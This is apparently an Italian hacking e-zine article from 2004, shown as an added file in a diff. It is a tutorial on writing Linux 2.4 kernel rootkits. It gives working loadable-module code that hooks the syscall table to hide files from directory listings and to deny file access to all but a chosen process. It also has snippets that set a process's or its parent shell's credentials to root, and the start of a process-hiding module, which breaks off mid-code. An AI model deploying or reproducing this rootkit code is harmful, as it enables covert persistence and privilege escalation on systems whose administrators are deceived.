@@ -1,0 +1,4182 @@
+================================================================================
+---------------------[ BFi13-dev - file 22 - 20/08/2004 ]-----------------------
+================================================================================
+
+
+-[ DiSCLAiMER ]-----------------------------------------------------------------
+        Tutto il materiale contenuto in BFi ha fini esclusivamente informativi
+        ed educativi. Gli autori di BFi non si riterranno in alcun modo
+        responsabili per danni perpetrati a cose o persone causati dall'uso
+        di codice, programmi, informazioni, tecniche contenuti all'interno
+        della rivista.
+        BFi e' libero e autonomo mezzo di espressione; come noi autori siamo
+        liberi di scrivere BFi, tu sei libero di continuare a leggere oppure
+        di fermarti qui. Pertanto, se ti ritieni offeso dai temi trattati
+        e/o dal modo in cui lo sono, * interrompi immediatamente la lettura
+        e cancella questi file dal tuo computer * . Proseguendo tu, lettore,
+        ti assumi ogni genere di responsabilita` per l'uso che farai delle
+        informazioni contenute in BFi.
+        Si vieta il posting di BFi in newsgroup e la diffusione di *parti*
+        della rivista: distribuite BFi nella sua forma integrale ed originale.
+--------------------------------------------------------------------------------
+
+
+-[ HACKiNG ]--------------------------------------------------------------------
+---[ LiNUX KERNEL EViL PR0GRAMMiNG DEMYSTiFiED ]--------------------------------
+-----[ Dark-Angel <DarkAngel@antifork.org> http://darkangel.antifork.org ]------
+
+
+PREMESSA: tutte le tecniche illustrate sono perfettamente funzionanti senza
+          modifiche per kernel 2.4.x
+
+PREMOSSA: mettere un kernel 2.4.x per provarle
+
+REQUISITI TECNICI: un minimo di programmazione C
+
+PREREQUISITI ESSENZIALI: Dato che le richieste di donne e denaro che ho fatto
+                         negli articoli precedenti non sono state ascoltate,
+                         proviamo a mettere "avere un lavoro molto ben pagato
+                         da offrirmi", non si sa mai che stavolta qualcuno
+                         salti fuori :-)
+
+
+                                L.K.E.P.D
+
+                Linux Kernel Evil Programming Demystified
+
+
+" For reasons of efficiency, Linux is not coded in a object-oriented language
+like C++ "
+                                     - Understanding Linux Kernel 2nd Edition
+
+
+SEZIONE I
+=========
+
+- LE BASI 
+
+Contrariamente ai rootkit user space, quelli kernel space sono decisamente piu'
+difficili da scovare, piu' efficaci e, aspetto non indifferente, notevolmente
+piu' piccoli. Unico neo, la portabilita', ma nulla e' portabile al 100%
+ovunque. Inoltre, non esistono software che siano in grado di rilevarli tutti,
+e quelli che ci sono hanno ampi margini di errore, ma di questo discuteremo in
+seguito.
+L'hacking a kernel space viene effettuato praticamente nella totalita' dei
+casi attraverso LKMs, ovvero Loadable Kernel Modules.
+I moduli sono utilizzati dal kernel per ampliare le proprie funzionalita',
+possono essere caricati in qualsiasi momento dal root od anche dal kernel
+stesso qualora ne avesse bisogno. Attraverso i moduli possiamo aggiungere
+supporti al kernel senza doverlo necessariamente ricompilare, tant'e' che
+molti device drivers sono realizzati tramite moduli.
+Ora vediamone la struttura. Ogni modulo ha perlomeno due funzioni:
+
+int init_module(void) 
+void cleanup_module(void) 
+
+L'init_module e' la funzione che viene eseguita al momento del caricamento del
+modulo nel kernel, la cleanup_module quella che viene eseguita alla sua
+rimozione. A parte questo la loro struttura e' come quella di un qualsiasi
+altro programma. Cambiano solo alcune cose dovute al fatto che stiamo lavorando
+a kernel space e non ad user space, ma le vedremo gradatamente strada facendo.
+Un esempio credo sia piu' utile di mille parole, percio' proviamo a stampare
+"ciao mondo" con un modulo. Non preoccupatevi se non capite il senso di alcuni
+pezzi di codice, verranno spiegati in seguito.
+
+<-| LKEPD/hello.c |->
+#define __KERNEL__ 
+#define MODULE
+#define LINUX
+#ifdef CONFIG_MODVERSIONS
+#define MODVERSIONS
+#include <linux/modversions.h>
+#endif
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+/* Include per i moduli */
+
+int init_module(void) {
+
+	printk("<1>Ciao Mondo\n");
+
+	return 0;
+}
+
+void cleanup_module(void) {
+	printk("<1>Modulo rimosso\n");
+}
+<-X->
+
+I primi tre #define servono semplicemente per dire che questo e' un modulo.
+CONFIG_MODVERSIONS e' stato creato per far si' che si possa caricare il modulo
+in qualsiasi kernel, restando consci del fatto che il caricamento fallira' se
+una qualsiasi struttura, tipo o funzione che il modulo usa e' cambiata.
+Se il kernel non e' stato compilato con CONFIG_MODVERSIONS si potranno caricare
+solamente moduli che sono stati compilati specificatamente per quel kernel e
+senza il MODVERSIONS abilitato.
+Se invece e' stato compilato con CONFIG_MODVERSIONS abilitato si potranno
+caricare moduli compilati per quel kernel con MODVERSIONS disabilitato, ma
+saremo anche in grado di caricare moduli con MODVERSIONS attivo fin quando le
+API che utilizza il modulo non cambieranno.
+printk e' l'equivalente a kernel space della printf. I numeretti tra <> sono
+opzionali e servono per indicare la priorita' del messaggio che verra'
+stampato.
+Esistono 9 livelli e piu' il numero e' basso piu' indica una priorita' alta.
+Bene, ora compiliamo:
+
+Vortex:~# gcc -c -I /usr/src/linux/include -O3 hello.c -o hello.o
+
+Notate che dobbiamo abilitare l'ottimizzazione del gcc con -O perche' molte
+funzioni sono dichiarate inline[1] negli header e gcc non le espande senza
+ottimizzazione.
+A questo punto possiamo:
+- Inserire il modulo col comando "insmod".
+- Guardare i moduli presenti nel kernel col comando "lsmod".
+- Rimuovere il nostro modulo col comando "rmmod"[2].
+
+Vortex:~# insmod hello.o
+Ciao Mondo
+Vortex:~# lsmod
+Module                  Size  Used by    Not tainted
+hello                    272   0  (unused)
+Vortex:~# rmmod hello
+Modulo rimosso
+
+[Se state eseguendo questo da una sessione X probabilmente non riceverete
+output, questo per via della configurazione di klogd. Usate dmesg per vedere i
+messaggi del kernel e dovrebbero apparire anche le scritte]
+
+Altri due concetti molto importanti sono la Kernel Symbol Table e quello di
+Syscall.
+Nel contesto della programmazione un simbolo e' un blocco costituente di un
+programma, puo' essere il nome di una variabile o di una funzione, ed il kernel
+non fa eccezione.
+In /proc/ksyms possiamo leggere tutti i simboli esportati [ovvero pubblici] del
+kernel, a cui possiamo accedere dai nostri moduli. Quando inseriamo un modulo
+tutti i suoi simboli diventano pubblici, cosa che nel nostro contesto e' da
+evitare assolutamente, percio' ricordatevi di utilizzare la macro
+EXPORT_NO_SYMBOLS per evitarlo.
+
+Ogni sistema operativo ha delle funzioni all'interno del suo kernel che
+vengono utilizzate per praticamente tutte le operazioni. Quelle funzioni sono
+le syscall, possiamo vederle come un'interfaccia con il kernel. Potete trovare
+la loro lista completa in <bits/syscall.h> .
+Naturalmente non occorre ricordarle tutte, vedremo man mano quelle che
+serviranno e come individuare syscall interessanti.
+Facciamo subito un esempio, mettiamo di voler creare un modulo che impedisca la
+creazione di directory con la sottostringa "admin" nel nome.
+Innanzitutto controlliamo con "strace" cosa succede quando utilizziamo il
+comando mkdir per creare una directory:
+
+Vortex:~# strace mkdir pippo
+execve("/bin/mkdir", ["mkdir", "pippo"], [/* 24 vars */]) = 0
+uname({sys="Linux", node="Vortex", ...}) = 0
+brk(0)                                  = 0x804cd48
+open("/etc/ld.so.preload", O_RDONLY)    = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY)      = 3
+fstat64(3, {st_mode=S_IFREG|0644, st_size=24152, ...}) = 0
+old_mmap(NULL, 24152, PROT_READ, MAP_PRIVATE, 3, 0) = 0x40012000
+close(3)                                = 0
+open("/lib/libc.so.6", O_RDONLY)        = 3
+read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\275Z\1"..., 1024) = 102
+4
+fstat64(3, {st_mode=S_IFREG|0755, st_size=1104040, ...}) = 0
+old_mmap(NULL, 1113796, PROT_READ|PROT_EXEC, MAP_PRIVATE, 3, 0) = 0x40018000
+mprotect(0x40120000, 32452, PROT_NONE)  = 0
+old_mmap(0x40120000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 3, 0x10
+7000) = 0x40120000
+old_mmap(0x40126000, 7876, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONY
+MOUS, -1, 0) = 0x40126000
+close(3)                                = 0
+old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0
+x40128000
+munmap(0x40012000, 24152)               = 0
+brk(0)                                  = 0x804cd48
+brk(0x804dd48)                          = 0x804dd48
+brk(0)                                  = 0x804dd48
+brk(0x804e000)                          = 0x804e000
+umask(0)                                = 022
+umask(022)                              = 0
+mkdir("pippo", 0777)                    = 0
+exit_group(0)                           = ?
+
+Come potete vedere nella penultima riga, abbiamo una chiamata dal nome
+piuttosto interessante. Proviamo a guardare nella man page:
+
+int mkdir(const char *pathname, mode_t mode);
+
+ottimo, corrisponde, proviamo ad intercettare la sys_mkdir allora.
+Intercettare una syscall e' molto semplice:
+innanzitutto nel nostro modulo dovremo dichiarare la sys_call_table come
+extern, e' un simbolo esportato percio' sara' risolto al momento
+dell'inserimento da insmod.
+Ma che cos'e' la sys_call_table? La sys call table e' un array di puntatori
+dove ciascun campo contiene un puntatore ad una sys call. Chiaramente
+modificando uno qualsiasi di questi campi si va a cambiare la funzione che
+verra' chiamata quando quella sys call verra' invocata. Ad esempio, se il
+puntatore in sys_call_table[0] punta alla funzione "true_func", cambiandolo e
+facendolo puntare a "fake_func" fara' in modo che quando la sys call numero 0
+verra' invocata la funzione ad essere eseguita sara' fake_func e non
+true_func.
+In secondo luogo dobbiamo dichiarare un puntatore a funzione, che faremo
+puntare alla sys call originale, in modo da poterla utilizzare una volta
+sostituito il puntatore nella sys call table con uno ad una nostra funzione.
+Eccone l'implementazione:
+
+<-| LKEPD/noadm.c |->
+#define __KERNEL__
+#define MODULE
+#define LINUX
+#ifdef CONFIG_MODVERSIONS
+#define MODVERSIONS
+#include <linux/modversions.h>
+#endif
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <sys/syscall.h>
+#include <string.h> 
+
+extern void *sys_call_table[];
+/* Va dichiarata come extern per poterci accedere */
+
+int (*old_mkdir)(char *, int);
+/* Useremo questo puntatore a funzione per
+ * memorizzare l'indirizzo della syscall originale
+ */
+
+int new_mkdir(char *name,int mode) {
+
+	if(strstr(name,"admin"))
+		return -1;
+
+	return old_mkdir(name,mode);
+	/* Nel caso non ci sia "admin" nel nome
+	 * richiama la syscall originale per completare
+	 * il lavoro
+	 */
+}
+
+int init_module(void) {
+
+old_mkdir=sys_call_table[SYS_mkdir];
+/* Ora old_mkdir punta alla sys_mkdir originale */
+
+sys_call_table[SYS_mkdir]=new_mkdir;
+/* Il puntatore alla sys_mkdir nella table viene sovrascritto
+ * con l'indirizzo della nostra funzione
+ */
+
+EXPORT_NO_SYMBOLS;
+/* Ricordate? Non dobbiamo esportare simboli */
+
+return 0;
+}
+
+void cleanup_module(void) {
+
+sys_call_table[SYS_mkdir]=old_mkdir;
+/* Ripristiniamo il valore corretto nella table */
+
+}
+<-X->
+
+Come potete vedere intercettare una syscall e' estremamente semplice.
+Inseriamo il modulo e proviamo a creare la directory pippoadmin:
+
+Vortex:~# insmod noadm.o
+Vortex:~# mkdir /tmp/pippoadmin
+mkdir: cannot create directory `pippoadmin': Operation not permitted
+Vortex:~#
+
+Magnifico, sembra che funzioni, ora rimuoviamolo e riproviamo:
+
+Vortex:~# rmmod noadm
+Vortex:~# mkdir pippoadmin
+Vortex:~#
+
+perfetto.
+
+Note:
+
+[1] Tuttavia un'ottimizzazione superiore a -O2 puo essere rischiosa perche' il
+compilatore puo' espandere come se fossero inline funzioni che non lo sono.
+Questo e' un problema perche' certe funzioni si aspettano una determinata
+struttura dello stack quando vengono chiamate.
+[2] Ovviamente e' possibile rimuovere un modulo solamente quando il suo usage
+count e' pari a zero.
+
+
+- COME NASCONDERE UN FILE
+
+Ecco, ora iniziano le cose divertenti. Innanzitutto, come ho precedentemente
+detto, dobbiamo ricorrere a strace per vedere che syscall vengono chiamate
+durante l'esecuzione del comando.
+
+(Tralascio gran parte dell'output in quanto non rilevante)
+
+Vortex:~# strace ls
+.
+.
+getdents64(3, /* 2 entries */, 4096)    = 48
+.
+.
+Vortex:~#
+
+Proviamo a controllare il man cosa ci dice circa questa funzione:[1]
+
+getdents - get directory entries
+
+Ottimo, esattamente quello che cercavamo[2].
+Ora guardiamo il prototipo di un'ipotetica getdents64 ed analizziamone i
+parametri: [3]
+
+int n_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
+                 unsigned int count)
+
+fd:    e' il file descriptor da cui la funzione andra' a leggere.
+
+dirp:  e' la zona di memoria in cui la funzione andra' a scrivere le varie
+       struct linux_dirent64 lette.
+
+count: e' la dimensione della zona di memoria dove andremo a scrivere.
+
+Una struttura linux_dirent64 e' l'equivalente a 64 bit della struttura dirent,
+che, in parole povere, non e' altro che la rappresentazione di un file.
+
+struct linux_dirent64 {
+       u64             d_ino;     /* Inode (per ora non pensateci, ne parleremo
+                                     in seguito) */
+       s64             d_off;     /* Offset alla prossima entry */
+       unsigned short  d_reclen;  /* Lunghezza di questa entry */
+       unsigned char   d_type;    /* Tipo dell'entry: directory, file normale,
+                                     socket... */
+       char            d_name[0]; /* Puntatore all'inizio del nome */
+}
+
+Quello che dovremo fare percio' sara':
+
+1) Redirigere la sys_getdents64 .
+2) Chiamare la sys_getdents64 originale e passargli i parametri che abbiamo
+   ottenuto tramite le redirezione.
+3) Filtrare i risultati e far sparire le cose scomode.
+
+Ricordiamoci pero' che noi andremo a modificare la sys call chiamata dalla
+funzione user space getdents, non la funzione stessa! Sembra un'inezia, ma c'e'
+una grossa differenza: le syscall lavorano a kernel space mentre le funzioni
+con le quali siamo abituati ad operare lavorano ad userspace. Come potete
+immaginare da kernel space non possiamo accedere direttamente alla memoria
+user space che, guarda caso, e' dove verranno memorizzati i risultati della
+nostra chiamata alla sys_getdents64 originale.
+Fortunatamente il kernel ci viene incontro, ma vedremo dopo.
+
+Per il punto 1 ed il punto 2 della nostra lista non ci dovrebbero essere
+problemi, e' esattamente quello che abbiamo fatto prima con la mkdir, mentre
+per il punto 3 potremmo semplicemente guardare tutte le strutture che la
+sys_getdents64 mettera' nel buffer per noi ed eliminare quelle scomode.
+Vediamone una possibile implementazione:
+
+<-| LKEPD/hide.c |->
+#define __KERNEL__
+#define MODULE
+#define LINUX
+#ifdef CONFIG_MODVERSIONS
+#define MODVERSIONS
+#include <linux/modversions.h>
+#endif
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/dirent.h>
+#include <linux/unistd.h>
+#include <linux/mm.h>
+#include <asm/uaccess.h>
+#include <sys/syscall.h>
+
+struct linux_dirent64 {
+       u64             d_ino;
+       s64             d_off;
+       unsigned short  d_reclen;
+       unsigned char   d_type;
+       char            d_name[0];
+};
+
+extern void    *sys_call_table[];
+char           *hide = "dark_"; /* Tutti i files aventi questo prefisso nel
+                                   nome saranno invisibili */
+long           (*o_getdents64) (unsigned int fd,
+				 struct linux_dirent64 * dirp,
+				 unsigned int count);
+
+long
+n_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
+	     unsigned int count)
+{
+    struct linux_dirent64 *dir,*ptr,
+                   *tmp,
+                   *prev = NULL;
+    long             i,rec=0,
+                    ret = (*o_getdents64) (fd, dirp, count);
+    if (ret <= 0)
+	return ret; /* In caso di errore ci limitiamo a restituirlo */
+
+    /* Allochiamo della memoria a kernel space tramite la funzione kmalloc,
+       come potete immaginare e' l'equivalente a kernel della malloc. Dobbiamo
+       dirgli quanta memoria e di che "tipo", noi dovremo mettere sempre il
+       valore GFP_KERNEL .
+       Qui kmallochiamo "ret" bytes, ovvero esattamente il numero che ci ha
+       restituito la funzione originale.
+    */
+    if ((tmp = (struct linux_dirent64 *) kmalloc(ret, GFP_KERNEL)) == NULL)
+	return ret;
+	
+    /* Ecco qui la soluzione all'inghippo kernel space <-> user space: abbiamo
+       2 funzioni, la copy_from_user e la copy_to_user che si occupano di
+       copiare dati da/a user space.
+       Noi copieremo a kernel space i dati restituiti ad user space dalla
+       funzione originale.
+    */
+
+    copy_from_user(tmp, dirp, ret);
+    ptr= dir = tmp;
+    i = ret;
+    
+    /* Ecco il ciclo principale del programma: 
+       abbiamo un puntatore alla prima entry e la esaminiamo, nel caso non la
+       riconosca (tramite strncmp) come indesiderata incrementa il puntatore di
+       d_reclen bytes (ovvero la dimensione dell'entry in esame) ed il ciclo
+       continua. Nel caso opposto invece viene aumentata la dimensione
+       dell'entry precedente di un numero di bytes pari alla dimensione della
+       corrente, poi azzeriamo la memoria occupata dall'entry corrente. In caso
+       dovessimo rimuovere la prima della lista dobbiamo solo incrementare il
+       puntatore e diminuire il numero di bytes da ritornare, tagliando cosi'
+       via il primo risultato. Il ciclo continua fino a che il numero di bytes
+       analizzati e' minore rispetto al numero di quelli ritornati dalla
+       sys_getdents64 originale.
+     */
+   
+    while (((unsigned long ) dir) < (((unsigned long) tmp) + i)) {
+	rec=dir->d_reclen;
+	if (strncmp(hide, dir->d_name,strlen(hide))==0) {
+	    if (!prev) {
+		ret -= rec;
+		ptr =
+		    (struct linux_dirent64 *) (((unsigned long) dir) +rec);
+	    } else {
+		
+		prev->d_reclen += rec;
+		memset(dir, 0, rec);
+
+	    }
+	} else
+	    prev = dir;
+	dir=(struct linux_dirent64 *)(((unsigned long)dir)+rec);
+    
+    }
+    /* Copiamo ad user space il risultato */
+    copy_to_user(dirp,ptr,ret);
+    
+    /* Liberiamo la memoria kmallocata */
+    kfree(tmp);
+    
+    return ret;
+
+}
+
+int
+init_module(void)
+{
+    o_getdents64 = sys_call_table[SYS_getdents64];
+    sys_call_table[SYS_getdents64] = n_getdents64;
+    return 0;
+}
+void
+cleanup_module(void)
+{
+    sys_call_table[SYS_getdents64] = o_getdents64;
+}
+/* 
+Questa linea serve dai 2.4.9 in avanti, nel caso la omettessimo
+il kernel risulterebbe "tainted". Se il vostro kernel e' precedente 
+rimuovetela pure.
+*/
+MODULE_LICENSE("GPL");
+<-X->
+
+Vortex:~# touch dark_test
+Vortex:~# ls
+drwxrwxrwt    5 root     root         4096 Feb  9 21:05 ./
+drwxr-xr-x   22 root     root         4096 Feb  6 05:20 ../
+-rw-r--r--    1 root     root            0 Feb  9 21:06 dark_test
+Vortex:~# gcc -c -O3 -I /usr/src/linux/include/ hide.c -o hide.o
+Vortex:~# insmod hide.o
+Vortex:~# ls
+drwxrwxrwt    5 root     root         4096 Feb  9 21:05 ./
+drwxr-xr-x   22 root     root         4096 Feb  6 05:20 ../
+Vortex:~#
+
+Ok, funziona. NB: il file non sara' visibile in questo modo, ma sara' comunque
+visibile/accessibile per operazioni/applicazioni che lo bersagliano
+direttamente, quali cat ad esempio. Come fare per evitare anche questo lo
+vedremo fra poco.
+
+Note:
+[1] getdents e getdents64 sono equivalenti ai nostri scopi, e' documentata la
+getdents, ma nei kernel recenti viene utilizzata la getdents64.
+[2] Per informazioni piu' specifiche su questa funzione guardate il manuale.
+[3] La variazione dei parametri e' fatta osservando la sys_getdents64 nel file
+fs/readdir.c dei sorgenti del kernel
+
+
+SEZIONE II 
+==========
+
+- RENDERE INACCESSIBILE UN FILE
+
+Come potete immaginare impedire l'accesso ad un file non e' nulla di complesso,
+basta semplicemente redirigere la sys_open ed effettuare un controllo come
+nella redirezione della sys_mkdir di esempio. Cosi' facendo pero' non potremo
+accederci nemmeno noi, percio' dobbiamo escogitare un qualche sistema che ci
+permetta di farlo senza problemi.
+Potremmo, ad esempio, far si' che solo un determinato processo possa aprire il
+file o, meglio ancora, far si' che solo un determinato utente possa farlo. In
+linux/sched.h dei sorgenti del kernel e' definita una struttura _estremamente_
+interessante, la struct task_struct. Questa rappresenta la struttura di un
+processo in memoria e contiene informazioni come il nome del processo, i suoi
+privilegi e molto altro. Per ovvi motivi non posso spiegarvi tutta la
+struttura, ne parlero' solo un po' per volta in base a quello che ci
+servira'[1]. Ora, mettiamo il caso di voler far si' che solo un programma che
+si chiami "pippo" possa aprire il file.
+Dovremo:
+
+1) Redirigere la sys_open.
+2) Controllare il file che sta cercando di aprire.
+3) Se il file e' nascosto ed il programma che sta cercando di accederci si
+   chiama pippo attiviamo la open originale, altrimenti ritorniamo un errore.
+
+Sembra facile, ma come facciamo a sapere quale programma sta tentando di
+accederci? Basta controllare il campo della task_struct che rappresenta il
+processo corrente che ne contiene il nome, precisamente il campo comm.
+Percio' bastera' un semplicissimo strcmp(processo->comm,"pippo") per effettuare
+questo controllo. Il problema ora sembrerebbe trovare in memoria qual e' la
+task_struct che rappresenta il processo corrente, ma fortunatamente il kernel
+ci viene in aiuto fornendoci un puntatore al processo corrente che si chiama
+"current". Percio' il nostro controllo si trasformera' in
+strcmp(current->comm,"pippo").
+Vediamo una piccola implementazione di quando detto finora.
+
+<-| LKEPD/access.c |->
+#define __KERNEL__
+#define MODULE
+#define LINUX
+#ifdef CONFIG_MODVERSIONS
+#define MODVERSIONS
+#include <linux/modversions.h>
+#endif
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <sys/syscall.h>
+#include <linux/sched.h>
+
+char	       *hide = "mio_";
+int		(*o_open)(char *,int,int);
+extern void * sys_call_table[];
+int n_open(char *path,int flags, int mode) {
+
+	if(strstr(path,hide)&& strcmp(current->comm,"pippo"))
+		return -ENOENT;
+	return o_open(path,flags,mode);
+}
+
+int
+init_module(void)
+{
+    o_open = sys_call_table[SYS_open];
+    sys_call_table[SYS_open] = n_open;
+    EXPORT_NO_SYMBOLS;
+    return 0;
+}
+void
+cleanup_module(void)
+{
+    sys_call_table[SYS_open] = o_open;
+}
+MODULE_LICENSE("GPL");
+<-X->
+
+Proviamolo:
+Vortex:~# gcc -c -O3 -I /usr/src/linux/include/ access.c -o access.o
+Vortex:~# echo ciao > mio_test
+Vortex:~# cat mio_test
+ciao
+Vortex:~# insmod access.o
+Vortex:~# cat mio_test
+cat: mio_test: No such file or directory
+Vortex:~# cp /bin/cat ./pippo
+Vortex:~# ./pippo mio_test
+ciao
+Vortex:~# 
+
+:)
+[2]
+
+
+- CONSIDERAZIONI
+
+Con l'introduzione della task_struct ed in particolare di current abbiamo messo
+a nostra disposizione un potente mezzo per realizzare ogni sorta di nefandezza:
+pensate ad esempio al modulo di poco fa, volendo avremmo potuto cambiare i
+diritti di accesso del processo corrente per renderlo capace di aprire files a
+cui normalmente non avrebbe potuto accedere:
+
+int n_open(char *path,int flags, int mode) {
+ 
+         if (strcmp(current->comm,"pippo")==0)
+         {
+	         current->uid=
+        	 current->euid=
+	         current->gid=
+        	 current->egid=
+	         current->suid=
+        	 current->sgid=
+	         current->fsuid=
+        	 current->fsgid=
+	         current->groups[0]=0;
+         }
+         return o_open(path,flags,mode);
+}
+
+Et voila' :)
+Con un po' di fantasia si puo fare qualunque cosa, ad esempio si potrebbe
+modificare una syscall in modo tale che se lanciata con determinati parametri
+nasconda un file, cambi i permessi di un processo o nasconda un altro processo.
+Grazie all'accoppiata current/syscall ora siamo in grado di creare dei
+primitivi sistemi di occultamento generalizzati: molti rootkit del passato ad
+esempio, utilizzando l'hooking della sys_write e controllando che il nome del
+processo fosse "netstat", nascondevano determinate connessioni alla vista
+dell'amministratore impedendo al processo di "scriverle". Ovviamente questo non
+e' l'approccio corretto al problema in quanto facilmente bypassabile anche solo
+cambiando nome al programma, ma dovrebbe contribuire a darvi un'idea di che
+cosa si riesce a fare.
+
+
+- ANCORA SUI PROCESSI 
+
+Vediamo ora in maniera un poco piu' approfondita il "processo".
+Linux memorizza i processi in una lista a doppia percorrenza (cioe' che puo'
+essere scorsa in entrambi i sensi) di strutture task_struct. Direttamente da
+sched.h:  struct task_struct *next_task, *prev_task;
+Come dicono i nomi stessi delle variabili, quelli sono rispettivamente il
+puntatore al processo seguente nella lista ed a quello precedente.
+Percio', ad esempio, per scorrere tutti i processi del sistema bastera' fare
+una cosa di questo tipo:
+
+struct task_struct *ptr=current;
+
+	do {
+		printk("Processo %s\n",ptr->comm);
+		ptr=ptr->next_task;
+	}
+	while(ptr!=current);
+
+Ma come nasce un processo? Semplificando molto, un processo viene "copiato" da
+un altro ad opera della sys_fork, poi viene "sovrascritto" con le nuove
+informazioni dalla sys_execve. Il processo da cui il nuovo nato e' stato
+copiato diventa suo "padre" mentre lui stesso diventa un "figlio" di suo padre.
+Ad esempio, se da una shell lanciamo il comando "ps" il processo della shell
+sara' il padre di ps.
+
+int n_open(char *path,int flags, int mode) {
+ 
+         if (strcmp(current->comm,"pippo")==0)
+         {
+                  current->p_pptr->uid=
+                  current->p_pptr->euid=
+                  current->p_pptr->gid=
+                  current->p_pptr->egid=
+                  current->p_pptr->suid=
+                  current->p_pptr->sgid=
+                  current->p_pptr->fsuid=
+                  current->p_pptr->fsgid=0;
+                  current->p_pptr->groups[0]=0;
+         }
+         return o_open(path,flags,mode);
+}
+
+Modificando in questo modo il codice di poco fa si cambiano i diritti del
+padre di pippo. Ovviamente nel caso in cui il padre sia una shell, l'esecuzione
+di pippo la rendera' una shell root :)
+
+
+- COME NASCONDERE I PROCESSI
+
+Vortex:~# strace ps
+.
+.
+open("/proc", O_RDONLY|O_NONBLOCK|O_LARGEFILE|O_DIRECTORY) = 5
+.
+.
+getdents64(5, /* 36 entries */, 1024)   = 1016
+.
+.
+Vortex:~#
+
+Come potete vedere viene aperta la directory /proc e viene letto il suo
+contenuto. Successivamente le informazioni vengono "raffinate" ed infine
+stampate sullo schermo. Proviamo ad andare in /proc ed a vedere cosa c'e':
+
+Vortex:/proc# ls
+total 4
+dr-xr-xr-x   67 root     root            0 Feb 19 15:18 ./
+drwxr-xr-x   22 root     root         4096 Feb  6 05:20 ../
+dr-xr-xr-x    3 root     root            0 Feb 20 02:14 1/
+dr-xr-xr-x    3 root     root            0 Feb 20 02:14 11/
+dr-xr-xr-x    3 root     root            0 Feb 20 02:14 1841/
+dr-xr-xr-x    3 root     root            0 Feb 20 02:14 1903/
+.
+.
+Vortex:/proc# cd 1841/
+Vortex:/proc/1841# ls
+total 0
+dr-xr-xr-x    3 root     root            0 Feb 20 02:15 ./
+dr-xr-xr-x   65 root     root            0 Feb 19 15:18 ../
+-r--r--r--    1 root     root            0 Feb 20 02:15 cmdline
+lrwxrwxrwx    1 root     root            0 Feb 20 02:15 cwd -> /root/
+-r--------    1 root     root            0 Feb 20 02:15 environ
+lrwxrwxrwx    1 root     root            0 Feb 20 02:15 exe -> /usr/bin/vim*
+dr-x------    2 root     root            0 Feb 20 02:15 fd/
+-r--r--r--    1 root     root            0 Feb 20 02:15 maps
+-rw-------    1 root     root            0 Feb 20 02:15 mem
+-r--r--r--    1 root     root            0 Feb 20 02:15 mounts
+lrwxrwxrwx    1 root     root            0 Feb 20 02:15 root -> //
+-r--r--r--    1 root     root            0 Feb 20 02:15 stat
+-r--r--r--    1 root     root            0 Feb 20 02:15 statm
+-r--r--r--    1 root     root            0 Feb 20 02:15 status
+Vortex:/proc/1841#
+
+Come potete vedere in /proc ci sono delle directory dal nome composto da
+numeri ed all'interno ci sono informazioni su processi. Il nome corrisponde
+al pid del processo e le informazioni contenute all'interno della rispettiva
+directory come potete immaginare si riferiscono a lui. Questo e' il "proc file
+system", un file system virtuale esistente interamente a kernel space
+utilizzato per lo scambio di informazioni. Parleremo in seguito del procfs, per
+ora basta che abbiate capito come funziona ps: legge da proc i processi
+esistenti, ne prende le informazioni richieste e stampa a schermo. Ancora una
+volta percio' la syscall che ci interessa e' la sys_getdents64. Questa volta
+pero' faremo qualcosa di piu', implementeremo anche un sistema per
+attivare/disattivare l'occultamento di un processo su richiesta.
+Innanzitutto dobbiamo prima imparare a capire se ci troviamo in /proc, in modo
+da sapere se attivare o no il filtraggio dell'output della getdents64 reale.
+Per far questo introduciamo un'altra cosa, l'inode, esattamente lo stesso che
+ho detto che avrei spiegato in seguito quando stavo parlando della struttura
+linux_dirent64. Vi siete mai chiesti come venga effettivamente memorizzato un
+file sul filesystem, come faccia il sistema a sapere dove andare effettivamente
+a cercare i bit che lo compongono dal disco rigido o dove sono memorizzate
+informazioni tipo la sua dimensione? La risposta e' l'inode.
+Ad ogni inode corrisponde un file e viceversa, possiamo dire che un file e' il
+suo inode. Percio' bastera' controllare se l'inode associato al file descriptor
+che viene passato come parametro alla getdents64 e' quello di /proc e sapremo
+se attivare o no il filtraggio. Per riconoscere i processi da nascondere invece
+useremo il campo "flags" della task_struct.
+Creeremo una maschera ad hoc che metteremo/toglieremo a richiesta attraverso
+gli operatori binari | e &. La nostra funzione controllera' la presenza o meno
+di questa maschera, cosi' da capire se si trova di fronte un processo nascosto
+oppure ad uno "regolare".
+Esempio:
+
+<-| LKEPD/mask.c |->
+#define MASK 0x1
+int main(void) {
+int pippo=0;
+	pippo|=MASK; // <- Inserisce la mask
+	if ((pippo&MASK)==MASK) // <- Ne controlla la presenza
+		printf("Mask presente\n");
+	else
+		printf("Mask assente\n");
+	pippo&=~MASK; // <- Toglie la mask
+
+	if ((pippo&MASK)==MASK)
+		printf("Mask presente\n");
+	else
+		printf("Mask assente\n");
+	return 0;
+}
+<-X->
+
+Vortex:~# gcc mask.c -o mask
+Vortex:~# ./mask
+Mask presente
+Mask assente
+Vortex:~#
+
+Ora credo che sia chiaro il funzionamento del controllo che andremo ad
+effettuare, percio' ora ecco il codice:
+
+<-| LKEPD/prochide.c |->
+#define __KERNEL__
+#define MODULE
+#define LINUX
+#ifdef CONFIG_MODVERSIONS
+#define MODVERSIONS
+#include <linux/modversions.h>
+#endif
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/dirent.h>
+#include <linux/unistd.h>
+#include <linux/mm.h>
+#include <asm/uaccess.h>
+#include <sys/syscall.h>
+#include <linux/proc_fs.h>
+#include <linux/smp_lock.h>
+struct linux_dirent64 {
+       u64             d_ino;
+       s64             d_off;
+       unsigned short  d_reclen;
+       unsigned char   d_type;
+       char            d_name[0];
+};
+
+extern void    *sys_call_table[];
+
+#define PF_INVISIBLE 	0x20000000 // La nostra mask
